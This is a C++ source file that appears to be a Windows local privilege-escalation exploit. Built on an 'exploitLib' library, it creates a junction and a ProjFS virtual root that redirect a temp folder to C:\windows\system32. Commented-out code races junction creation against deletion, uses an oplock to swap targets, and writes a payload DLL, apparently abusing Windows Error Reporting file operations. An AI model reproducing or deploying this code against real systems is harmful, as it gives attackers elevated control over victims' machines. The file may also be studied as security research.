#ifdef proj
#include <exploitLib/exploitLib.h>
#include <exploitLib/primitives.h>
#include <exploitLib/projfs.h>
#include "resource.h"
#include <exploitLib/IPC/WER.h>
using namespace x::literalNS;


int main(int argc, const char* args[])
try
{
  // x::writePayloadToFile< EMBEDDED_PAYLOAD >("%LOCALAPPDATA%\\payload.dll"_p);
   x::file tmpFolder{ "C:\\windows\\temp\\"_p / x::guid::random_guid(), FILE_READ_ATTRIBUTES,FILE_DIRECTORY_FILE };
  // x::file tmpFolder{ "\\??\\unc\\localhost\\c$\\windows\\temp\\"_p / x::guid::random_guid(), FILE_READ_ATTRIBUTES,FILE_DIRECTORY_FILE };

   x::file junc{ (tmpFolder / "junc")   , FILE_WRITE_ATTRIBUTES,FILE_DIRECTORY_FILE }; 
  /*
   auto th = std::make_shared< std::thread >([&]()
      {
            bool ab = true; 
            while (true)
            { 
               try
               {

                  if (ab) 
                     {
                     junc.makeJunction("C:\\"_nt);
                     } 
                  else 
                     {
                     junc.delete_reparse_point(IO_REPARSE_TAG_MOUNT_POINT);
                  }
                  Sleep(1);
                  ab = !ab;
               }
               catch (...) { 
                  bool s = false;
                  while (!s)
                  {
                     try 
                     {               
                        x::file ft{ junc / "tracing"_p , DELETE,0,FILE_OPEN };
                        ft.rename(tmpFolder / x::guid::random_guid());
                        //ft.deleteFile();
                        s = true;
                     }catch(...) {}
                  }
               }
            }
        
      });*/

   
//   x::file qq{ tmpFolder / "wrt12"   , DELETE|FILE_GENERIC_READ|FILE_GENERIC_WRITE ,FILE_OPEN_REQUIRING_OPLOCK,0 };
/*   qq.setShortName(L"wrt1");
   qq.makeoplock(std::function< bool(x::ack<x::file>) >{
      [&](x::ack<x::file> file)
      {
         qq.rename( "%TEMP%"_p / x::guid::random_guid());
         x::file { (tmpFolder / "junc")   , MAXIMUM_ALLOWED,FILE_DIRECTORY_FILE }.makeJunction("%WINDIR%\\system32"_nt);

         file.doAck();
         return false;
      }
   });
   */
   x::splitterDir sp{ "C:\\demo22"_p, tmpFolder.getNTPath().c_str(),L"\\??\\c:\\windows\\system32"s.c_str() };

   virtualRoot vroot{sp.getLink() };
   try { vroot.makefile("junc\\tracing", true); }
   catch (...) {}

  /*
   while (true)
   {
   }*/
     
 //  submitBlankReport();
   //th->join();
   getchar();
   return 0;
}
catch (wil::ResultException& e) { std::cerr << e.what() << std::endl; }
catch (std::exception& e) { std::cerr << e.what() << std::endl; }
#endif